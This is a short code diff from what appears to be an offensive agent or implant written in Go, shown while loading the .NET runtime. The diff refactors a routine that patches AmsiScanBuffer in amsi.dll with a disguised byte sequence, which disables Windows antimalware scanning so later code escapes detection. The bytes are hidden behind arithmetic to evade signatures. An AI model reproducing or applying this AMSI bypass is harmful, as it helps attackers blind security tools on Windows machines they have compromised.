@@ -98,7 +98,8 @@ func startCLR(runtime string) (results jobs.Results) {
 
 	// Patch AMSI ScanBuffer
 	if !patched {
-		out, err := evasion.Patch("amsi.dll", "AmsiScanBuffer", &[]byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1})
+		patch := []byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1}
+		out, err := evasion.Patch("amsi.dll", "AmsiScanBuffer", &patch)
 		if err != nil {
 			results.Stderr = fmt.Sprintf("there was an error patching the amsi!ScanBuffer function: %s", err)
 		} else {
